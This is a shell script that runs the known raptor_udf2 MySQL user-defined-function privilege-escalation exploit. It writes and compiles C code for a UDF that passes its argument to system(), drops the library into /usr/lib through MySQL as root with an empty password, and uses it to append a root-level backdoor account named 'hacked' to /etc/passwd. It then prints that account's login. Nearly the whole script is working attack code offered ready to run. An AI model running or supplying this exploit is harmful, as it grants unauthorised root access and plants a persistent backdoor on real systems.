#!/bin/sh
#############################################################################################
#  Credit goes to the author of the exploit here: https://www.exploit-db.com/exploits/1518/ #
#                              Simple UDF wrapper script                                    #
#############################################################################################

cat > /tmp/raptor_udf2.c << _EOF

#include <stdio.h>
#include <stdlib.h>
 
enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
 
typedef struct st_udf_args {
    unsigned int        arg_count;  // number of arguments
    enum Item_result    *arg_type;  // pointer to item_result
    char            **args;     // pointer to arguments
    unsigned long       *lengths;   // length of string args
    char            *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;
 
typedef struct st_udf_init {
    char            maybe_null; // 1 if func can return NULL
    unsigned int        decimals;   // for real functions
    unsigned long       max_length; // for string functions
    char            *ptr;       // free ptr for func data
    char            const_item; // 0 if result is constant
} UDF_INIT;
     
int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
    if (args->arg_count != 1)
        return(0);
 
        system(args->args[0]);
	     
        return(0);
}
 
char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
    return(0);
}

_EOF

cd /tmp

gcc -g -c raptor_udf2.c
gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

cat > /tmp/raptor.sql << _EOF

create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('echo "hacked:haTxXsV9b6sBA:0:0:root:/root:/bin/bash" >> /etc/passwd');

_EOF

mysql -u root --password='' -D mysql < /tmp/raptor.sql

echo "Login with the following username and password: username=hacked password=hacked"
